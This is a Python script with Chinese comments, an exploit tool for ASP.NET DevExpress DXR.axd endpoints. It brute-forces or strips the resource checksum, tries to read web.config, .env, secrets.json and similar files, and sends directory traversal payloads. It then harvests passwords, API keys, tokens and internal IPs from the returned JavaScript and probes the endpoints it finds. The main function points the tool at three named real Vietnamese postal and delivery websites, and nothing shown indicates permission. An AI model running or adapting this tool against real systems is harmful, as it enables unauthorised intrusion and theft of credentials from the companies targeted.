"""
ASP.NET DXR.axd 端点深度分析工具
基于Burp Suite实战思路，实现校验和绕过和深度分析
"""

import asyncio
import aiohttp
import json
import re
import hashlib
import base64
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
from urllib.parse import urljoin, urlparse
import logging

# 配置日志
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

@dataclass
class DXRAnalysisResult:
    """DXR分析结果"""
    target_url: str
    is_vulnerable: bool
    bypass_method: Optional[str] = None
    discovered_apis: List[str] = None
    sensitive_info: List[str] = None
    file_access_results: Dict[str, Any] = None
    js_analysis: Dict[str, Any] = None

class ASPNETDXRAnalyzer:
    """ASP.NET DevExpress端点分析器"""

    def __init__(self):
        self.session = None
        self.results = []

        # 常见敏感文件列表
        self.sensitive_files = [
            'web.config',
            'app.config',
            'connectionStrings.config',
            'machine.config',
            'web.release.config',
            'web.debug.config',
            'appsettings.json',
            'secrets.json',
            '.env',
            'database.json',
            'api-keys.json',
            'config.json'
        ]

        # API端点模式
        self.api_patterns = [
            r'/api/[\w/]+',
            r'/[\w]+\.asmx',
            r'/[\w]+\.ashx',
            r'/ajax/[\w/]+',
            r'/service/[\w/]+',
            r'/rest/[\w/]+'
        ]

        # 校验和爆破字典
        self.checksum_bruteforce = [
            'POYgv', 'POYgw', 'POYgu', 'POYgt', 'POYgx', 'POYgy', 'POYgz',
            'POYhv', 'POYhw', 'POYhu', 'POYht', 'POYhx', 'POYhy', 'POYhz',
            'POYiv', 'POYiw', 'POYiu', 'POYit', 'POYix', 'POYiy', 'POYiz',
            'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
            'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'
        ]

    async def __aenter__(self):
        self.session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30))
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    async def analyze_dxr_endpoint(self, target_url: str) -> DXRAnalysisResult:
        """分析DXR.axd端点"""
        logger.info(f"开始分析目标: {target_url}")

        result = DXRAnalysisResult(
            target_url=target_url,
            is_vulnerable=False,
            discovered_apis=[],
            sensitive_info=[],
            file_access_results={},
            js_analysis={}
        )

        try:
            # 第一步：基础探测
            base_response = await self._test_dxr_base(target_url)
            if not base_response:
                logger.warning(f"目标 {target_url} 无法访问或不是DXR端点")
                return result

            # 第二步：校验和绕过测试
            bypass_result = await self._test_checksum_bypass(target_url)
            if bypass_result['success']:
                result.is_vulnerable = True
                result.bypass_method = bypass_result['method']
                logger.info(f"✅ 校验和绕过成功: {bypass_result['method']}")

                # 第三步：文件访问测试
                file_results = await self._test_file_access(target_url)
                result.file_access_results = file_results

                # 第四步：深度JS分析
                js_analysis = await self._analyze_js_content(base_response['content'])
                result.js_analysis = js_analysis
                result.discovered_apis.extend(js_analysis['apis'])
                result.sensitive_info.extend(js_analysis['secrets'])

            else:
                logger.info(f"❌ 校验和绕过失败，但仍进行JS分析")
                # 即使无法绕过，也可以分析JS内容
                js_analysis = await self._analyze_js_content(base_response['content'])
                result.js_analysis = js_analysis
                result.discovered_apis.extend(js_analysis['apis'])
                result.sensitive_info.extend(js_analysis['secrets'])

        except Exception as e:
            logger.error(f"分析 {target_url} 时发生错误: {e}")

        result.sensitive_info = list(set(result.sensitive_info))  # 去重
        result.discovered_apis = list(set(result.discovered_apis))  # 去重

        self.results.append(result)
        return result

    async def _test_dxr_base(self, target_url: str) -> Optional[Dict[str, Any]]:
        """测试基础DXR端点"""
        dxr_url = urljoin(target_url, 'DXR.axd')

        try:
            async with self.session.get(dxr_url) as response:
                if response.status == 200:
                    content = await response.text()
                    logger.info(f"✅ 成功访问DXR.axd端点，响应大小: {len(content)} 字符")
                    return {
                        'url': dxr_url,
                        'status': response.status,
                        'content': content,
                        'headers': dict(response.headers)
                    }
                else:
                    logger.warning(f"访问DXR.axd失败，状态码: {response.status}")
                    return None
        except Exception as e:
            logger.error(f"测试基础DXR端点失败: {e}")
            return None

    async def _test_checksum_bypass(self, target_url: str) -> Dict[str, Any]:
        """测试校验和绕过"""
        logger.info("开始校验和绕过测试...")

        # 第一步：尝试完全移除校验和
        bypass_url = urljoin(target_url, 'DXR.axd?r=1_0')
        result = await self._test_bypass_attempt(bypass_url, "移除校验和")

        if result['success']:
            return result

        # 第二步：尝试爆破校验和
        logger.info("开始校验和爆破...")
        for checksum in self.checksum_bruteforce:
            bypass_url = urljoin(target_url, f'DXR.axd?r=1_0,{checksum}')
            result = await self._test_bypass_attempt(bypass_url, f"爆破校验和: {checksum}")

            if result['success']:
                return result

        # 第三步：尝试常见文件
        for filename in self.sensitive_files[:5]:  # 测试前5个敏感文件
            bypass_url = urljoin(target_url, f'DXR.axd?r={filename}')
            result = await self._test_bypass_attempt(bypass_url, f"访问文件: {filename}")

            if result['success'] and result.get('is_file', False):
                result['method'] = f"文件访问成功: {filename}"
                return result

        return {'success': False, 'method': None}

    async def _test_bypass_attempt(self, bypass_url: str, method: str) -> Dict[str, Any]:
        """测试单次绕过尝试"""
        try:
            async with self.session.get(bypass_url) as response:
                if response.status == 200:
                    content = await response.text()
                    content_length = len(content)

                    # 检查是否返回了文件内容而不是JS
                    is_file = False
                    if filename := self._extract_filename_from_url(bypass_url):
                        if filename in self.sensitive_files:
                            is_file = True
                            logger.info(f"🎯 发现敏感文件: {filename}")

                    # 检查是否返回了正常的JS内容
                    is_js = 'typeof DXR' in content or 'dxr' in content.lower()

                    if is_file:
                        return {
                            'success': True,
                            'method': method,
                            'is_file': True,
                            'content': content,
                            'filename': filename
                        }
                    elif is_js and content_length > 1000:  # 确保返回了有意义的JS内容
                        return {
                            'success': True,
                            'method': method,
                            'is_file': False,
                            'content': content
                        }
                    else:
                        return {'success': False, 'method': method}

        except Exception as e:
            logger.debug(f"绕过尝试 {method} 失败: {e}")

        return {'success': False, 'method': method}

    def _extract_filename_from_url(self, url: str) -> Optional[str]:
        """从URL中提取文件名"""
        try:
            parsed = urlparse(url)
            path_parts = parsed.path.split('/')
            query = parsed.query

            if 'r=' in query:
                r_part = query.split('r=')[1].split(',')[0]
                if '.' in r_part:
                    return r_part
        except:
            pass
        return None

    async def _test_file_access(self, base_url: str) -> Dict[str, Any]:
        """测试文件访问能力"""
        logger.info("开始文件访问测试...")

        results = {}

        # 测试敏感文件
        for filename in self.sensitive_files:
            file_url = urljoin(base_url, f'DXR.axd?r={filename}')
            result = await self._test_file_access_single(file_url, filename)
            results[filename] = result

        # 测试目录遍历
        traversal_tests = [
            f'DXR.axd?r=..\\..\\web.config',
            f'DXR.axd?r=../web.config',
            f'DXR.axd?r=..%2f..%2fweb.config'
        ]

        for traversal in traversal_tests:
            traversal_url = urljoin(base_url, traversal)
            results['traversal_test'] = await self._test_file_access_single(traversal_url, 'directory_traversal')

        return results

    async def _test_file_access_single(self, file_url: str, filename: str) -> Dict[str, Any]:
        """测试单个文件访问"""
        try:
            async with self.session.get(file_url) as response:
                if response.status == 200:
                    content = await response.text()
                    content_length = len(content)

                    # 判断文件类型
                    file_type = 'unknown'
                    if filename.endswith('.config'):
                        file_type = 'config'
                        if 'connectionString' in content or 'add name=' in content:
                            logger.info(f"🎯 发现数据库连接配置: {filename}")
                    elif filename.endswith('.json'):
                        file_type = 'json'
                        if 'password' in content or 'secret' in content:
                            logger.info(f"🎯 发现敏感配置JSON: {filename}")
                    elif 'directory_traversal' in filename:
                        file_type = 'traversal'
                        if 'configuration' in content.lower():
                            logger.info(f"🎯 目录遍历成功!")

                    return {
                        'accessible': True,
                        'status': response.status,
                        'content_length': content_length,
                        'file_type': file_type,
                        'content_snippet': content[:200] + '...' if len(content) > 200 else content
                    }
                else:
                    return {
                        'accessible': False,
                        'status': response.status,
                        'error': 'not_accessible'
                    }
        except Exception as e:
            return {
                'accessible': False,
                'error': str(e)
            }

    async def _analyze_js_content(self, js_content: str) -> Dict[str, Any]:
        """深度分析JS内容"""
        logger.info("开始JS内容深度分析...")

        analysis = {
            'apis': [],
            'secrets': [],
            'endpoints': [],
            'functions': [],
            'internal_ips': []
        }

        try:
            # 1. 搜索API端点
            for pattern in self.api_patterns:
                matches = re.findall(pattern, js_content, re.IGNORECASE)
                analysis['apis'].extend(matches)

            # 2. 搜索敏感信息
            sensitive_patterns = {
                'connectionString': r'connectionString\s*=\s*[\'"]([^\'"]+)[\'"]',
                'password': r'password\s*[:=]\s*[\'"]([^\'"]+)[\'"]',
                'api_key': r'(?:api[_-]?key|apikey|APIKEY)\s*[:=]\s*[\'"]([^\'"]+)[\'"]',
                'secret': r'(?:secret|SECRET)\s*[:=]\s*[\'"]([^\'"]+)[\'"]',
                'token': r'(?:token|TOKEN)\s*[:=]\s*[\'"]([^\'"]+)[\'"]',
                'database': r'(?:database|DATABASE|server|SERVER)\s*[:=]\s*[\'"]([^\'"]+)[\'"]'
            }

            for key, pattern in sensitive_patterns.items():
                matches = re.findall(pattern, js_content, re.IGNORECASE)
                analysis['secrets'].extend(matches)

            # 3. 搜索内部IP地址
            ip_pattern = r'\b(?:192\.168|10\.|172\.(?:1[6-9]|2[0-9]|3[01])|127\.0\.0\.1)\.\d{1,3}\b'
            analysis['internal_ips'] = re.findall(ip_pattern, js_content)

            # 4. 搜索函数名
            function_pattern = r'(?:function|const|let|var)\s+(\w+)\s*\('
            analysis['functions'] = re.findall(function_pattern, js_content)

            # 5. 搜索可能的业务逻辑
            business_patterns = [
                r'getUserInfo|getUserDetails|fetchUser',
                r'updateOrder|changeOrder|modifyOrder',
                r'payment|pay|transaction',
                r'admin|administrator|root',
                r'delete|remove|destroy',
                r'create|add|insert',
                r'select|query|get|fetch'
            ]

            for pattern in business_patterns:
                matches = re.findall(pattern, js_content, re.IGNORECASE)
                analysis['endpoints'].extend(matches)

            # 6. 尝试寻找Base64编码的内容
            base64_pattern = r'[A-Za-z0-9+/]{20,}[=]{0,2}'
            base64_matches = re.findall(base64_pattern, js_content)

            for match in base64_matches:
                try:
                    decoded = base64.b64decode(match).decode('utf-8')
                    if len(decoded) > 10 and any(char in decoded for char in '@:/'):
                        analysis['secrets'].append(f"Base64 decoded: {decoded[:50]}...")
                except:
                    pass

            logger.info(f"JS分析完成: 发现 {len(analysis['apis'])} 个API, {len(analysis['secrets'])} 个敏感信息")

        except Exception as e:
            logger.error(f"JS分析失败: {e}")

        return analysis

    async def test_discovered_apis(self, target_url: str, apis: List[str]) -> Dict[str, Any]:
        """测试发现的API端点"""
        logger.info("开始测试发现的API端点...")

        api_results = {}

        for api in set(apis):
            api_url = urljoin(target_url, api)
            result = await self._test_single_api(api_url)
            api_results[api] = result

        return api_results

    async def _test_single_api(self, api_url: str) -> Dict[str, Any]:
        """测试单个API端点"""
        result = {
            'url': api_url,
            'accessible': False,
            'methods': [],
            'vulnerabilities': []
        }

        try:
            # 测试GET方法
            async with self.session.get(api_url) as response:
                if response.status == 200:
                    result['accessible'] = True
                    result['methods'].append('GET')

                    content = await response.text()

                    # 检查是否包含敏感信息
                    if any(keyword in content.lower() for keyword in ['password', 'token', 'secret', 'key']):
                        result['vulnerabilities'].append('potential_data_leakage')

                    # 检查是否是JSON格式
                    try:
                        json.loads(content)
                        result['response_type'] = 'json'
                    except:
                        result['response_type'] = 'text'

            # 测试POST方法
            test_data = {"test": "data"}
            async with self.session.post(api_url, json=test_data) as response:
                if response.status == 200:
                    result['methods'].append('POST')

        except Exception as e:
            result['error'] = str(e)

        return result

    def generate_burp_suite_report(self) -> str:
        """生成Burp Suite风格的报告"""
        report = []
        report.append("# ASP.NET DXR.axd 端点分析报告")
        report.append(f"## 生成时间: {asyncio.get_event_loop().time()}")
        report.append("")

        for result in self.results:
            report.append(f"### 目标: {result.target_url}")
            report.append("")

            if result.is_vulnerable:
                report.append("#### 🎯 漏洞状态: **可利用**")
                report.append(f"- **绕过方法**: {result.bypass_method}")
                report.append("")
            else:
                report.append("#### 🚫 漏洞状态: **无法绕过**")
                report.append("")

            if result.discovered_apis:
                report.append("#### 🔍 发现的API端点:")
                for api in result.discovered_apis[:10]:  # 显示前10个
                    report.append(f"- `{api}`")
                report.append("")

            if result.sensitive_info:
                report.append("#### 🔐 发现的敏感信息:")
                for secret in result.sensitive_info[:10]:  # 显示前10个
                    report.append(f"- `{secret[:50]}...`")
                report.append("")

            if result.file_access_results:
                report.append("#### 📁 文件访问测试结果:")
                for filename, file_result in result.file_access_results.items():
                    if file_result.get('accessible'):
                        report.append(f"- ✅ **{filename}**: 可访问 ({file_result.get('file_type', 'unknown')})")
                    else:
                        report.append(f"- ❌ **{filename}**: 不可访问")
                report.append("")

            report.append("---")
            report.append("")

        return "\n".join(report)

async def main():
    """主测试函数"""
    # 测试目标
    test_targets = [
        "https://viettelpost.com.vn/",
        "https://vnpost.vn/",
        "https://giaohangnhanh.vn/"
    ]

    async with ASPNETDXRAnalyzer() as analyzer:
        for target in test_targets:
            print(f"\n{'='*60}")
            print(f"分析目标: {target}")
            print(f"{'='*60}")

            result = await analyzer.analyze_dxr_endpoint(target)

            if result.is_vulnerable:
                print(f"[SUCCESS] 目标存在校验和绕过漏洞!")
                print(f"绕过方法: {result.bypass_method}")

                if result.sensitive_info:
                    print(f"[SECRET] 发现敏感信息:")
                    for secret in result.sensitive_info[:5]:
                        print(f"  - {secret[:50]}...")

                if result.discovered_apis:
                    print(f"[API] 发现API端点:")
                    for api in result.discovered_apis[:5]:
                        print(f"  - {api}")
            else:
                print(f"[FAILED] 目标暂未发现校验和绕过漏洞")

                if result.discovered_apis or result.sensitive_info:
                    print(f"但仍发现有价值的信息:")
                    if result.discovered_apis:
                        print(f"[API] API端点: {len(result.discovered_apis)} 个")
                    if result.sensitive_info:
                        print(f"[SECRET] 敏感信息: {len(result.sensitive_info)} 个")

        # 生成Burp Suite报告
        report = analyzer.generate_burp_suite_report()
        print(f"\n{'='*60}")
        print("Burp Suite 分析报告")
        print(f"{'='*60}")
        print(report)

        # 保存报告到文件
        with open("dxr_analysis_report.txt", "w", encoding="utf-8") as f:
            f.write(report)

        print(f"\n报告已保存到: dxr_analysis_report.txt")

if __name__ == "__main__":
    asyncio.run(main())